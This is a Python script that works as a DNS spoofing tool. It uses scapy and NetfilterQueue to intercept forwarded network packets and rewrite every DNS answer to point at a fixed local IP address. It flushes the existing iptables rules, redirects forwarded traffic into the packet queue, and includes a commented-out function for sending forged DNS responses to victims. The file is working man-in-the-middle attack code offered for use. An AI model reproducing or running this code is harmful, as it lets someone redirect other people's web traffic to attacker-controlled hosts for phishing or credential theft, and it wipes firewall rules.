#!/usr/bin/env python3

from scapy.all import *
from colorama import init, Fore
from netfilterqueue import NetfilterQueue
from .banner import *

def process_packet(packet):
	scapy_packet = IP(packet.get_payload())

	if scapy_packet.haslayer(DNSRR):
		print(f"{GREEN}[Before]:{RESET} ", scapy_packet.summary())
		# memodifikasi paket
		try:
			modify(scapy_packet)
		except IndexError:
			pass
		
		print(f"{GREEN}[After]:{RESET} ", scapy_packet.summary())
		packet.set_payload(bytes(scapy_packet))
	
	packet.accept()


def modify(packet):
	qname = packet[DNSQR].qname
	# filter taruh sini 
	packet[DNS].an = DNSRR(rrname=qname, rdata="192.168.43.77") #ipnya sendiri
	packet[DNS].ancount = 1
	
	del packet[IP].len
	del packet[IP].chksum
	del packet[UDP].len
	del packet[UDP].chksum


if __name__ == '__main__' :
	QUEUE_NUM = 0
	os.system("iptables --flush")
	os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
	queue = NetfilterQueue()
	queue.bind(QUEUE_NUM, process_packet)
	queue.run()


	# def fake_dns_response(pkt):
	# 	# result = check_victims(pkt)
	# 	if (pkt[IP].src != lhost and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 :
	# 		cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
	# 		fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=lhost) / DNSRR(rrname=pkt[DNSQR].qname,rdata=lhost))
	# 		send(fakeResponse, verbose=0)
	# 		print("    [#] Spoofed response sent to "+"["+pkt[IP].src+"]"+": Redirecting "+"["+cap_domain+"]"+" to "+"["+lhost+"]")
